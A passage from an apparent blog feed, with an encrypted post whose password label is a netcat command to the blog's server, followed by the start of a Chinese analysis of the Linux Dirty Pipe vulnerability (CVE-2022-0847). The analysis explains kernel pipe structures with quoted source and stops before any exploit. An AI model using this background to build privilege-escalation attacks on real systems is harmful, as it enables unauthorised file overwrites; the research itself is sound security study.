08ee913b4266b98a121bc796341f73d6e22f0c6434b483559c8a4e8e4a4aa872502d5c8d6dcf6945bce542f378741d306feef09e4883073ac1f0946d00178d0b3bef4c73bfd9974485efaa349943e8b02ef5b579105f3b96a200e06902b7cdcc5d62fc52ab8b757203303cd390154c6531c320f3a410adaa7242a97128465e438d303e72f5e69b0c6ed75bd678a50b9a7047ad433e67976c396ce2c4ba4fd0d7fe2dc186a7eff41f6eaa92cabba9fb758219dedb9c8a419136cd1e701ea8af867519319c7aa89a1f9326b22186824a23046d114cf2ee01278019c3d383c315aa7de1a64ca26889d8194880c409bfe586e6375ca771c7d0842cad31fa4b6ec26f5fef73f0bbd551e0ed26ff3d48896f2725a51a56ef09ccc84fbc8593d96adffbf36b0c99e64209b329b19a3a5cf11b7ff4d1520c6220259b6e1e882d93fa305398c97cf697a2412656a321f7a17179bdf402d19bbdecb23c76706b760d2b8ad212574f186149d7911de95436489fbd9004d433529621fc1c3910a4769735b2c034acc8abb8721dcba3b611b0351c739ccaa99fcfae285b1ab37be4f27f4f0dceaf2f067f34f81dc5cae4ea721cf05f901849789131611214615c4b353b11416d94fee1b91a786f3db5568ad85c67a5735d9bef71e2a2a8482b22facf53a95d226c96c998de66e3b5ac8d58f926dcfd4c51288cf0cc6b6bebc0352bb8671d77e60c2455fae9616a3932aa111162b680784745f2eee154cedbcbcd965a77a50017bb37c9449a9b8c1a97deb323ae64ed215cb85e5dfa7d12d2b29ac5c0fd27a3513b0e7bd9535ebd6ec31062da2ea62e0b38cae5f326f5509e9d5fd876b569372350651911d441e8f2ee33ab1cb30f64ecdc4d8e7674bcbe8a08a6c3ab9b095dbaf968ba5e6079116e2af67909aa235fe0fb24c4e4f637ea03fe965035719c21bf24b7c0e836b47261da8808c2a7345a93b604a480f57bb35b2c7e3d102855170adcc72188a5dcb13be83a0ca885328225d419bb3e3667f55c520338a97f2879708e00370d5e8f2d42066405456f7ea1ee4fcd67df1549a7afe5aba83db502900d3c7fb9dab5382bd5b27bf20a2936c1f29557b69586ab6ae9f801a3da2319c2c135df63dbd0844aaf6895d260bf053cc0f5b0fd8081567e985d93c74c2a83c63e7573d07bbd6b734a6a838a20efa8746324610852028c8f1ffc12e737073d48b7925a8261bdd52f0d498a6dc020fdf8269153fa7c703e9e04ecbe0e6ba1a211b8fc1b6bec428abf09e81c2ef572ce43fd4e6d6a755123d7c8863ac45a10b83fe1e844963ef6b1196543ad99a0ab602c92758e9d6665bab13d1d479b3fc3af674f9bea692ba968946b4c5418206c4f9df43d67ccae76afcae728e9cfd778196d61f038eb191009ce34ac4e87c97826d972e5a8e067827d25036023988bb97e03a5e7bf526f75f993f6ee79d4778f74c96e85ed024a0507e969269e79e3f1812795cdc08171cd14a4000bbfde3a6925035915707ae7b8d878c98f593c3aa6ee8f7311160164239637c1ccfb360448671d38f7b2abe5dbb46b8ff4e7c1b266099d21c14221cddb76c2831841f32d7840eba6ae03e07b1e456d8032584a43f165ce90cd1c7d053c169781b1ab9ce7e231a7340d837ccdd71e87a7009a564697df36bd9cc2ea16a531ec463e1a63d5d1fc780b84a29196c9eadd0ad0c03b06aecc463ff8069d12ef772f0352235a8cc87af8ac305c21f3c8d6b9f08a74d67700fc3fa037395bab8eca94756df69229f78eaebad651b941fbcd63e564f29ae43036014e1d1d8578028b58e0059c3fea05ac24089ec34ee5ee2b299342163cbcb950bd73a55f84aeea24e7f98f736f694eeefd8e1cc2749f2e1d1708badc7a9f5fec25ac1032865a3d42cdc0b61df0d207e2b0a037fdfc7195d225077b5e70885abf953f6b34fa255493ffbb31fd58d36c3e88f3214d195743a3a30f96a7b5bb1b0d273e053be0700d1927d3e3734ab337ec219b50f733d57cf0505e096c5af026bb27983fa1e52562e3ddd59c6e9052c715e2b436a9b4ba3ff7998dc14e7b42842a315f61d7d83eee592008932c7fe54b1b06ec218e130c1aeae699149db4ba263f6af66fea6dc7c0783bd27e469a2b5a4c5785991c3d9448ac74b6e31014c71a7ee78e9854355991239f43a48212cde8520abfd097299f6391369d4043a64b5a7d8c158a3191927cc16e74e76e1d9c9fe80202dbc3f1c9fdfe72e0519229f416546b96708a78f694d48986183cf7070097432de35d68429bd2dd04697fa9756db89020a78e331b4baf7c644bf77b68899f1b6a74c6944edf72ec6dd915f3ebd69adca58a3d6f6cb0dfa9acbc55eef7e6bdf721e0254b2a67106d72e9b2d49a7c3a3558c180d73bea7447e5e750082e11c8f2598e47535b042907a664da8b5f7affbe99180276bd1e21440ff24a924a1bf94dd4f5a8b7ee2fca218da76d8656fdf200a385c387f29153d3a39434a8d2b393313538438590c054bc708b8cefd9432f4c0dccdde9073db7e74295037af894de9d85fa97c19e31acb975c695b2420893e5ad430d74342e0a6438a307fb1db191557c615b8b09bd529d03a97b523a0ee5a2509450db5e5042f85d939d4292f3d4bf43e497fda71873719cbe2917f7ee25006aa984f57486d7e265d61bb470cdf92293538c58766f39ba965a6198861747794f5fa5c60a346803f3d81f683f3bfcc5dc85c363001959b1c2b523b53e14cda801f7ada297ebdb78d05fbbb9bb2cb217ec885b97de4a7dcd892365c97f91b1534829e4098c1a9aa012e4d4fb2bc9b84e646c075cdce9dc2910a9973ec1bdf7fd2782d5f982eb447ac4af53e0b87362d04125e2d187f708e7de5bc594a2802a6b6ef3292dea23209ed34c621ed5d7092e641d8be118f486516ea067b6e7f8bf6bb7b4a3a636659c0e9cc2b0ee8642e348d99d4f68eeacd59e1213388aec0aa421dfb62204fb4701c7be66f7cd54024748b388e4d40d837c9db3117e1eb6af3f4330fb04107ba4a2a9de2a8d132ffafb1e2f3e64efc1a498af42b45d9edf92e39aa9be8b692b3d66f6fc0844d44ec5c9f6175df12e72c945694ab648631086c3e0b7ddc0b5a9e67fa206fc407749866ed01e34caa08b34c54471a566537ab93a1fba428732e85d8425a3aeed35057757aff35c5ca4b4802c0ddfebf1dae97f301b1ac485db80b6b281268677abda466666d072f3cbc5f4458fc06973ea5b1b5da62b7f48f601b7341edb79e8339c7a64d59b345ae6d9150c54a04c3deedbc75e9e468fc721c3447dac60b77a70a344ca17aa2f89d2d34d3ce995015719db8c5dbe1d3a211ea78d942d5bacfa3980975b4b7f0a42f14445f87f2ce9702c51347c708756144b02d7bfc1d8a578b01e99403a729bd6445007667b5e2e9ef3e1ee19d84667aad6ba3a07e33f4e176ca1e699e919ce79de7b58937a6a9f3494239b85da7b87509bef6dacd7d51d1d67633062d972776b2a24ea9006947c3b94b8a8b81868774d73afa6df8c547b2c01752b691b939a82ac1a873aaa3337868621223ffe1b68b4be8a927553456bb48e41bde2812330e3a70cef436ff1b47c5a36e833908aa1a28fa7f88583b6b5b517debda3bdc56d94722b662a041c481f9e5a451b56f9de65d37ecc5099b4bf25178c396ebd013353ace413ed3d72de89c1825fd879f4a83e7cb38c19fc0683cf776c1475313528a644ccc383e343068cabfe1566daba4c6b9e0aa64f925f553f9339b52898085bc76585d0a843a41d541d27b26edd7cc3a50a20835b5b276e1c2d29228d784053e159de34d080cbaf871d0627f0769e59cbc7488530fa9e2b1e2049b9975d919be87cf2e612cbfafaf9c6f29c90d4b14ce81895d82e23c0fac81e26cd8806128990a0d226f489ef56000a7e41942fe9a1014dbadd73f40c05de5cfb6b0eaff9a3447580e02116d679b0cd5036d838deee3e53a6116bf44d3c3491eadda1e82c7a38d758a613a55e2deae2f932e1a3977fb0e53860680994d6ce322cf7a15e0ea7e5f56e12912cf0aebb845259561ba2aaa2d4e234898a292486472a7d6af7505f965f6e38b6ea14e955ffcc155d1fdecc054f33dbc62538755b7124e5704f3f3cdfc34c02ab94644a3757716242d24c416880472507f37d1bf1b92f424d7a8405e51894c1a7009a31585b6d78c1518d51ab93d13065859390072d2f804ac03f552324368fb96c86b46e9d1a04be65e9ecb1ddfbc5360abf3a8287087bd374e699cf543f257ced59f2651344cec9cea9821fc0b4760fccef7a3bca7a6904519d149e17af4621c80fdef690f72c24897c8a1b2b7ddfe0544e97006099b7e8e4e0ffd0680d2825607edbb72465fc0698f3a98245f3335ba065c8aa966c2f066086deaee88a5b88f21aa44aa8fb188fe7306fc867ce913d79e9289478f331647d175c6df199d5c4fcb64f9a29fd4607de750f79d7a2f82a8e2acd3923f52f664b2a2c77166f7558817c604ced8fa7852d3d7ad651a93e15e06b9fee30ec548c3da2c31806f52fbb6895e8b6c2fa5825ddb80b32e66a0bc937b525a4169e2756983c7ba18df94bc2df335af649bdbee9043db939dffc4bd1935aee2a382555379bd0e3be55db97b01f3699a91767e333c3587509b26d2a7c103591433bd793962202c96b5fe567174b46ca0035a7601d1cb87f38bf216ae87034e2e1d0a17edb14a8b0a6110eb6901663514fa39b1e4589d5d1bb79acc356d790e64ebd288876d4b293d6eacc5f2cda88d02cff20b30d2ab78f268243b5979ca7a9c7247cc10f870339e8b13eae04e4281bfbae010fb9faac0601118bfbebd6f72ac2129be1edddf0c8954fd60562bdcb291d0606b30d893939529ec776f89be62c22e9712c14ee89aa28c37dda13ef4f1e1938e3b99184a9912b35d4fca3e313d8752c1f3f9d1be9ee86152adadc2f73758dc3be54d717b51c8b04e69c5c927a6fbd70f73ccbcf9c9c213d7007460a40127b8ccff67ab04e0aa85af4d30e29f54852103974f4702aab027514caaa22f5bfcf008e8a73a1ae7624cc3db573260ff042d32d1d98ddeb20b547f292d9b294dc94e0f932e1c2eb3503c220fa1e52cb1be3b91d50fa5289f50def4b8728a6de707cb7bb5fcddd16528f7ffb79a3786009b64f9e503c5287ead40124ceb50e70ae422ecaf4027bee88a48cca046144ec09f3a5d36895f16f68964590394defe42d6db6255135c901c7268da2fe8809f115c770f6b69ff8968da24ac4ac4ef71bd2d8122395d8bcebca6339b073956c3ef194d8177ae52612c69390e110dc7aa1e2742d48d97e48d1e0d89cb81b9da08923aa88600629f251e6bd1dba66be54ac35d8a68156665a433f2e700af84dfb92bda0579aa22bc0aa2f1d867e483cb98bbeff9eb3a68122e3aa911fc86be4ad7502ca06813dade1082c2f9c0fadb272ab3a563fa2b0aa2062085fba162577659aa7f5887f7db70b71a8c67da7e418725e879a539094f66aad904d1df5d09ee1f84000f410c1b5e0560dd5bae8605994f725927c678865ba4907aef05717b70e22f88a4f3d3ce9a9fe8ffd3176ffa4b8807e7064a4507748f7db47f12ea46b77e0f2120285e0ed59e845d4018f9eebe86f5b9e9f3120180592013ff7111cb430c53346e99acad0354f63b5d04efa367a03944c850c2a74f04b71e86c898f32aee1b7590e8b32914b2c9477f735076239ddf095f1d5d47f23264e0a2bb331add0b378a700c4989f991799c41e501cfa21783416a0dca61087015d7cf395d2ed6caa7cfdf28ca78215f6148701480dc615036cd884aa8c0c307122b6115fdfafefb7a7600fcaee500cfa4b3f3697084f3e7b1e2a03cb7e9633a638af6fbba679d81b1a1f164271530e291b5deaba79ca65e9ed7e72f07db46b7b07df2875e7ae82cb66e05c79245f9cf6b33ff511a53b599c5c33b18a9a0b4bc76d522d63730bbf95e6beff327925afbe1455d9e5507e7a0134d5c2d5d812f1788cb675884ee81fb449bfe86fbc1e04c805876528c9d1ba6f2676970b208b01149972e959469ceeff3dbb12725c1400f21d3ced001dd5c8f6ba14cfb2e43584cfc4faabe0ff0932595e86911f95415df54dc00a9400c9b2086944c1371361dd6a91363d456ed4af0faf63057dafd0cf4cacafeb9ae858b2782106e68d5a1494aee168b8e7e72131ff5eb2de26d1c6f803758917f22e5dbe33248e3ad5673d703c231020892d0efedc16a8cde86afc3ef8e153877a95c367d828e64598aaa37786f127d4c7081494f52fe69ec6360309fb3bf3432e5a00f87f4a902fd9c6c9b0a11a914afd6ad793f6a267fbdb6562da54614c5aa5870a57c964c50fa054be3c3ea81c599eb36e9034d4d98b68106b7d892639d8cfa40b2efa14504a257920397a4244a9fb0e954e14c54097f4e4d88abc917c1f39247079e1003115738fd2496816d4a3c7f93a3d9edc27ab434371de481ae787c0730c94b2b8e02102aad3b69ac193b695a2007a596fdad40fbdb4233a042ad40eb813134456ea4a74eb85226eb2269adda26a448d3ee1601d0fda8805506773c8ce8bd419b41b658aa199c5a5f58b2bfc6a444a1546abf1ab41a700112cda6a973946a1feb9f27dc55c0751317c04ae2a17da65dedb6f8b1276a2ae1471fee864138c783c6a6f381486d31f05af181a9e17c2b03f49a6425866e30ccee40091680925b652f14b57d71e391379b2c61cc6d6b997d2705284eb51c8617dc31783c3fbe2ca32259f5f70c30588dc50576e503f55230f1f31364944c842586d0d08b81927ac6cf77534673947bf5db73202532c2c693a243680998be7203f49336be23577f396ed431edbac2ff7df3ffefcf5d570a3158b70983776e4b65e975e5034de2326d99fd1b98d2bf541911332be7103c8541d11f061563f79736e90d2d6b6cd299744bab5a76bffc1d49d40ddab1d74e06346632ffcd5f83d2436e9b0dda9fb538cabde9fc4aaa387c189395a3642d8308688df868cc29c70e9048fc49dd44a7c131ea76c468ea6764ed34e6f66477177809b77d85da6545f5bdeb9be97107e92251a87d9015cad2ee890137e6f923fd7af94276dba0d4c92b0a2fd34502b596c5fe7e99a3f19d09e85b3175d09fbacbd390ff02c3d4a5075291c8c38306cc460dfd384c1184c084cf98b84f562b2788aa0001c76e6cbdb74e535f76264e8aa7550aa4f233a7a2be0a007d5f8f62ab28cd70683112a6f4c6e7566fbb099e2895a41dd1f2322ae8790e6ccc0ab77cb4649184ea30859532cd18cca30769777b37f17bab78cb5524366c3b8ab07e05b2f207b4da6dfced11eedb8c5951aac7b303067daf171ef629748067cca7ef9eff875e978a4c06c5893c6d0fe207e32ef8975c68ac7cde736ce25ada3a53e668f8caa877b2a180422138025ed7cd9a11062731afc16ff1e597841b4ad28b85c9169ab706d8b4dea536c50726a2f386c95a35cd6a74eb18aec702f8a64b0fd1c3a33bfba0286cd60b5bd02dae5915aafd285163ee37c265ef8e5fd2edf84eca3eb280f18b216d794e11e6c869a123393890ccf5027e75005b41930a895730beba82ff3bbaac483f718d104206f73f9767d88e6e019186dc441d49537a34e1cf1766fa8589cfbfc4542946a1191b2b8979adeae8ac5b499fda865a2dbc671b3d1f910d9bd1eb4c4449d7b424588dc6eb23feecddbed41339160ae8cf77c4ab30e5bf92bee8227008fda2c1f1c478cb090dabd3e9f5801adb4ceb69c0246e2c7d04d6a39346fedd101c2ba88f2b66ac9f767</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>我超，管人痴！</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>CVE-2022-0847 是这两天刚爆出来的一个热乎的内核漏洞，漏洞主要发生在对管道进行数据写入时，由于未对原有的 <code>pipe_buffer-&gt;flags</code> 进行清空，从而导致了<strong>可以越权对文件进行写入</strong>；由于这样的漏洞形式类似于“脏牛”（CVE-2016-5195），但更加容易进行利用，因此研究人员将该漏洞称之为「Dirty Pipe」</p><p>据研究者描述，目前 <strong>5.8 版本以上的内核均会收到该漏洞的影响</strong>，在 <strong>5.16.11</strong>、<strong>5.15.25</strong>、<strong>5.10.102</strong> 版本中才被修复，影响范围不可谓不大，因此这个漏洞也得到了高达 7.8 的 CVSS 评分（CVSS 评分好像改版了，2.0 的标准只有 7.2分）</p><p>这个漏洞的发现源自于一次 CRC 校验失败，感兴趣的可以看<a href="https://dirtypipe.cm4all.com/">原作者的博客</a>，是一段十分奇妙的旅程（笑）</p><p>本次选用进行分析的内核源码为 Linux 5.13.19（因为笔者前些天刚好编译了一个这个版本的内核，刚好受到该漏洞影响，就直接拿来用了）</p><p>在开始分析之前，我们先来补充一些前置知识</p><h2 id="pipe：管道">pipe：管道</h2><p>稍微接触过 Linux 的同学应该都知道「管道」这一 IPC 神器。而在 Linux 内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> （即创建了一个虚拟文件节点）来表示的，其中在节点上存放管道信息的是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息</p><p>当我们创建一个管道时，内核会创建一个 VFS inode 、一个 <code>pipe_inode_info</code> 结构体、两个文件描述符（代表着管道的两端）、一个 <code>pipe_buffer</code> 结构体数组，下图是一张叙述管道原理的经典图例</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><p>用来表示管道中数据的是一个 <code>pipe_buffer</code> 结构体数组，单个 <code>pipe_buffer</code> 结构体用来表示<strong>管道中单张内存页的数据</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: 管道缓冲区中存放了数据的页框</span><br><span class="hljs-comment"> *@offset: 在 @page 中数据的偏移</span><br><span class="hljs-comment"> *@len: 在 @page 中数据的长度</span><br><span class="hljs-comment"> *@ops: 该 buffer 的函数表， 参见 @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: 管道缓冲区的标志位，参见上面</span><br><span class="hljs-comment"> *@private: 函数表的私有数据</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>创建管道使用的 pipe 与 pipe2 这两个系统调用最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">get_pipe_inode</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_pipe_info</span>()</span><br></code></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，即一个管道初始默认可以存放 16 张页面的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>管道形成的核心结构如下图所示</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page 结构体用以<strong>唯一标识一个物理页框</strong>，参见 <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>管道的本体是一个 <code>pipe_inode_info</code> 结构体，其管理 <code>pipe_buffer</code> 数组的方式<strong>本质上是一个循环队列</strong>，其 head 成员标识队列头的 idx，tail 成员标识队列尾的 idx，<strong>头进尾出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: 保护一切的互斥锁</span><br><span class="hljs-comment"> *@rd_wait: 空管道中读者的等待点</span><br><span class="hljs-comment"> *@wr_wait: 满管道中写者的等待点</span><br><span class="hljs-comment"> *@head: 缓冲区的生产点</span><br><span class="hljs-comment"> *@tail: 缓冲区的消费点</span><br><span class="hljs-comment"> *@note_loss: 下一次 read() 应当插入一个 data-lost 消息</span><br><span class="hljs-comment"> *@max_usage: 在环中使用的 slots 的最大数量</span><br><span class="hljs-comment"> *@ring_size: 缓冲区的总数 (应当为 2 的幂次)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: 缓存的已释放的页面</span><br><span class="hljs-comment"> *@readers: 管道中现有的读者数量</span><br><span class="hljs-comment"> *@writers: 管道中现有的写者数量</span><br><span class="hljs-comment"> *@files: 引用了该管道的 file 结构体数量 (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: 读者计数器</span><br><span class="hljs-comment"> *@w_counter: 写者计数器</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: 管道缓冲区循环数组</span><br><span class="hljs-comment"> *@user: 创建该管道的用户</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="管道函数表：">管道函数表：</h3><p>阅读 pipe 系统调用源码，注意到如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_file_pseudo</span>()</span><br></code></pre></td></tr></table></figure><p>在创建管道文件的函数 <code>create_pipe_files()</code> 中，传入 <code>alloc_file_pseudo()</code> 的函数表为 <code>pipefifo_fops</code>，这便是管道相关的操作的函数表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_pipe_files</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file **res, <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br>    <br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>该函数表中定义了我们对管道的相关操作会调用到的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>.splice_write= iter_file_splice_write,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="管道的写入过程">管道的写入过程</h3><p>查表 <code>pipefifo_fops</code> 可知当我们向管道内写入数据时，最终会调用到 